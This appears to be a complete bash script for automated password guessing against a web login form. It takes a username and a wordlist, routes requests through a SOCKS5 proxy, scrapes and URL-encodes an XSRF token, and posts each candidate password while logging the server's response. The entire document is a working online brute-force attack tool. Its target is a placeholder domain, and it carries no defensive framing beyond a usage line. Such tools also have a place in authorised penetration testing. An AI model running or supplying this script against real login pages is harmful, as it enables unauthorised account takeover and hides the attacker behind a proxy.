#!/bin/bash
# DESCRIPTION: Automated Password Guessing
# USAGE:       passguess.bash  username  PasswordList

username=$1
PasswordList=$2

x='socks5://localhost:8089'
c="cookie"
u='user:password' # Basic Authentication
baseURL='https://domain.tld'

urlencode='echo urlencode($argv[1]);'
username=$(php -r "$urlencode" "$username")

token_prefix='xsrf-token" value="'
token_pattern='[^"]+'

responsePattern='(Wrong credentials)|(Wellcome...)'


echo -e "\nUSERNAME\tPASSWORD\tRESPONSE\n"
t=$(date +%s)
for password in $(cat $PasswordList)
do
  curl -ski -x $x -c $c -u $u $baseURL/login > response

  token=$(grep -Eo "$token_prefix$token_pattern" response)
  token=$(echo -n "$token" | sed "s/$token_prefix//")
  token=$(php -r "$urlencode" "$token")
  d="
    token=$token&
    username=$username&
    password=$password"
  d=$(echo -n $d | tr -d ' \n')
  curl -ski -x $x -b $c -u $u -d "$d" $baseURL/login > response
  response=$(grep -Eo "$responsePattern" response)
  echo -e "$username\t$password\t$response"
done
echo -e "\nElapsed time: $[$(date +%s)-$t] seconds."

